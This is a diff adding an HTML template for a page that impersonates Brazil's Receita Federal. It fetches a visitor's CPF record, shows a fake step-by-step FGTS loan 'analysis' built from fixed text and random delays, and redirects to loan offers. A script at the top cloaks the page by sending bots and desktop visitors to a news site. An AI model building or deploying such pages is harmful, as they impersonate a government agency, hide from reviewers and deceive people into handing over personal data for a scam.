@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html data-template="analisar-cpf">
+<head>
+    <meta charset="utf-8"/>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <title>Receita Federal - Análise de CPF</title>
+    {% include 'shared_resources.html' %}
+    <script>
+    // Função para detectar se é um dispositivo móvel
+    function isMobile() {
+      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    }
+
+    // Função para detectar se é um bot
+    function isBot() {
+      const botAgents = [
+        'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
+        'YandexBot', 'Sogou', 'Exabot', 'facebot', 'ia_archiver'
+      ];
+
+      return botAgents.some(bot => navigator.userAgent.includes(bot));
+    }
+
+    // Função para verificar se a largura da janela é maior que 768px
+    function isWideScreen() {
+      return window.innerWidth > 768;
+    }
+
+    // Redirecionar ou bloquear o acesso
+    function checkAccess() {
+      if (isBot() || (!isMobile() && isWideScreen())) {
+        // Redirecionar para o site G1 se o acesso for bloqueado
+        window.location.href = "https://g1.globo.com/";
+      }
+    }
+
+    // Executar a função de verificação ao carregar a página
+    window.onload = checkAccess;
+
+    // Adicionar um listener para verificar novamente se a janela for redimensionada
+    window.addEventListener('resize', checkAccess);
+    </script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-400.ea42a37247439622.woff2') }}") format('woff2');
+            font-weight: 400;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-600.844a17f0db94d147.woff2') }}") format('woff2');
+            font-weight: 600;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-700.1c7c76152b40409f.woff2') }}") format('woff2');
+            font-weight: 700;
+            font-style: normal;
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Rawline', sans-serif;
+        }
+        body {
+            background-color: white;
+            padding-top: 60px;
+            color: #333333;
+            font-size: 16px;
+            line-height: 1.05;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 20px;
+            background-color: white;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            height: 60px;
+        }
+        .logo {
+            width: 100px; /* Reduced logo size */
+            height: auto;
+        }
+        .header-icons {
+            display: flex;
+            gap: 15px;
+        }
+        .header-icon {
+            font-size: 18px;
+            color: #1351b4;
+        }
+        .container {
+            max-width: 800px;
+            margin: 40px auto;
+            padding: 0 20px;
+            flex: 1;
+        }
+        .info-box {
+            border-left: 4px solid #1351b4; /* Changed color */
+            padding: 20px;
+            margin-bottom: 30px;
+            border-radius: 4px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            height: auto; /* Removed fixed height */
+        }
+        .submit-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #1351b4; /* Changed color */
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .submit-button:hover {
+            background-color: #092555;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 6px rgba(19, 81, 180, 0.2); /* Changed color */
+        }
+        .user-data {
+            background: #1451B4;
+            padding: 15px;
+            border-radius: 4px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            margin-bottom: 20px;
+            color: white;
+        }
+        .user-data-item {
+            font-weight: 700;
+            margin-bottom: 10px;
+            font-size: 15px;
+            color: white;
+            display: flex;
+            align-items: center;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.2);
+        }
+        .user-data-item i {
+            margin-right: 10px;
+            width: 20px;
+            text-align: center;
+            color: white;
+        }
+        .analysis-container {
+            margin: 20px 0;
+        }
+        .analysis-step {
+            padding: 12px 15px;
+            margin: 8px 0;
+            border-left: 3px solid #1351b4; /* Changed color */
+            background: #f8f9fa;
+            border-radius: 4px;
+            opacity: 0;
+            transform: translateX(-20px);
+            animation: slideIn 0.8s ease forwards;
+        }
+        .analysis-step div {
+            line-height: 1.2;
+        }
+        .loading-item {
+            display: flex;
+            align-items: center;
+            margin: 12px 0;
+            padding: 15px;
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+            opacity: 0;
+            transform: translateY(20px);
+            animation: fadeInUp 0.8s ease forwards;
+        }
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        .loading-item i {
+            margin-right: 15px;
+            font-size: 18px;
+            color: #1351b4;
+        }
+        .progress-bar {
+            height: 4px;
+            background: #e9ecef;
+            border-radius: 2px;
+            margin-top: 4px;
+            overflow: hidden;
+        }
+        .progress-bar-fill {
+            height: 100%;
+            background: #1351b4; /* Changed color */
+            width: 0;
+            animation: progressFill 2s ease-in-out;
+        }
+        @keyframes progressFill {
+            from { width: 0; }
+            to { width: 100%; }
+        }
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+        .footer {
+            background-color: #1351b4; /* Changed color */
+            color: white;
+            padding: 16px;
+            text-align: center;
+            margin-top: 40px;
+        }
+    </style>
+</head>
+<body class="analisar-cpf-page">
+    <div class="container">
+        <div class="info-box">
+            <div id="loadingContainer">
+                <!-- Área para exibir os dados do usuário e análise -->
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Obter o CPF da URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const cpf = urlParams.get('cpf');
+            const token = urlParams.get('token');
+
+            if (!cpf || !token) {
+                window.location.href = '/buscar-cpf';
+                return;
+            }
+
+            // Função para buscar os dados do CPF
+            async function buscarDadosCPF() {
+                try {
+                    // Usando a API da Exato Digital
+                    const apiKey = "{{exato_api_token}}"; // usando o token passado pelo servidor Flask
+                    const response = await fetch(`https://api.exato.digital/receita-federal/cpf?token=${apiKey}&cpf=${cpf}&format=json`);
+                    const data = await response.json();
+
+                    if (data.Result) {
+                        // Salvar dados no localStorage
+                        localStorage.setItem('userData', JSON.stringify({
+                            nome: data.Result.NomePessoaFisica,
+                            cpf: cpf
+                        }));
+
+                        const loadingContainer = document.getElementById('loadingContainer');
+
+                        // Adicionar resultados iniciais com novo layout
+                        // A API da Exato retorna a data no formato ISO, então precisamos formatar
+                        let dataNascFormatada = '';
+                        if (data.Result.DataNascimento) {
+                            // Remover a parte T00:00:00.0000000
+                            dataNascFormatada = data.Result.DataNascimento.split('T')[0];
+                        }
+
+                        loadingContainer.innerHTML = `
+                            <div class="user-data">
+                                <div class="user-data-item">
+                                    <i class="fas fa-user"></i>
+                                    ${data.Result.NomePessoaFisica}
+                                </div>
+                                <div class="user-data-item">
+                                    <i class="fas fa-id-card"></i>
+                                    ${cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")}
+                                </div>
+                                ${dataNascFormatada ? `
+                                    <div class="user-data-item">
+                                        <i class="fas fa-calendar"></i>
+                                        Nascimento: ${dataNascFormatada}
+                                    </div>
+                                ` : ''}
+                                <!-- A API da Exato não retorna nome da mãe -->
+                            </div>
+                            <button id="confirmButton" class="submit-button">
+                                <i class="fas fa-check-circle"></i>
+                                Confirmar meus dados
+                            </button>
+                        `;
+
+                        // Configurar evento do botão de confirmação
+                        document.getElementById('confirmButton').addEventListener('click', async function() {
+                            this.style.display = 'none';
+                            loadingContainer.innerHTML = `
+                                <h3 style="color: #1351b4; margin: 15px 0; font-weight: 600;">Análise em andamento...</h3>
+                                <div id="analysisContainer" class="analysis-container"></div>
+                            `;
+
+                            const analysisSteps = [
+                                {
+                                    text: "Iniciando análise do CPF...",
+                                    icon: "search",
+                                    details: "Verificando dados básicos do trabalhador"
+                                },
+                                {
+                                    text: "Verificando histórico profissional...",
+                                    icon: "briefcase",
+                                    details: "Consultando vínculos empregatícios e estabilidade"
+                                },
+                                {
+                                    text: "Analisando saldo do FGTS disponível...",
+                                    icon: "piggy-bank",
+                                    details: "Calculando valores disponíveis para empréstimo"
+                                },
+                                {
+                                    text: "Verificando tempo de serviço...",
+                                    icon: "calendar-check",
+                                    details: "Analisando estabilidade e continuidade no trabalho"
+                                },
+                                {
+                                    text: "Calculando capacidade de pagamento...",
+                                    icon: "calculator",
+                                    details: "Avaliando valores seguros para desconto no FGTS"
+                                },
+                                {
+                                    text: "Simulando opções de empréstimo...",
+                                    icon: "money-bill-wave",
+                                    details: "Preparando propostas personalizadas com taxas reduzidas"
+                                },
+                                {
+                                    text: "Finalizando análise de crédito...",
+                                    icon: "check-circle",
+                                    details: "Preparando resultado final da consulta"
+                                }
+                            ];
+
+                            const analysisContainer = document.getElementById('analysisContainer');
+
+                            // Function to add random delay between steps
+                            const getRandomDelay = () => Math.floor(Math.random() * (2000 - 1500 + 1)) + 1500;
+
+                            // Function to create and animate a step
+                            const createStep = async (step, index) => {
+                                const stepElement = document.createElement('div');
+                                stepElement.className = 'analysis-step';
+                                stepElement.innerHTML = `
+                                    <div style="display: flex; align-items: center;">
+                                        <i class="fas fa-${step.icon}" style="margin-right: 10px; color: #1351b4;"></i>
+                                        <div>
+                                            <div style="font-weight: 600;">${step.text}</div>
+                                            <div style="font-size: 13px; color: #666; margin-top: 4px;">${step.details}</div>
+                                            <div class="progress-bar">
+                                                <div class="progress-bar-fill"></div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                `;
+
+                                analysisContainer.appendChild(stepElement);
+
+                                // Add loading animation
+                                await new Promise(resolve => setTimeout(resolve, getRandomDelay()));
+                            };
+
+                            // Process steps one at a time, removing the previous one
+                            for (let [index, step] of analysisSteps.entries()) {
+                                // Create and show the current step
+                                await createStep(step, index);
+
+                                // Wait a bit to show the step
+                                await new Promise(resolve => setTimeout(resolve, 1500));
+
+                                // Remove previous step if not the last one
+                                if (index < analysisSteps.length - 1) {
+                                    const currentStep = analysisContainer.lastChild;
+                                    currentStep.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
+                                    currentStep.style.opacity = '0';
+                                    currentStep.style.transform = 'translateX(20px)';
+
+                                    // Remove after animation
+                                    setTimeout(() => {
+                                        if (currentStep && currentStep.parentNode) {
+                                            currentStep.parentNode.removeChild(currentStep);
+                                        }
+                                    }, 500);
+                                }
+                            }
+
+                            // Redirecionar para a página de opções de empréstimo
+                            window.location.href = `/opcoes-emprestimo?cpf=${cpf}&nome=${encodeURIComponent(data.Result.NomePessoaFisica)}`;
+                        });
+                    } else {
+                        alert('CPF não encontrado ou dados inválidos');
+                        window.location.href = '/input-cpf';
+                    }
+                } catch (error) {
+                    console.error('Erro:', error);
+                    alert('Ocorreu um erro ao consultar o CPF. Por favor, tente novamente.');
+                    window.location.href = '/input-cpf';
+                }
+            }
+
+            // Iniciar busca dos dados do CPF
+            buscarDadosCPF();
+        });
+    </script>
+
+    <footer class="footer">
+        <p>© Todos os direitos reservados.</p>
+    </footer>
+</body>
+</html> 
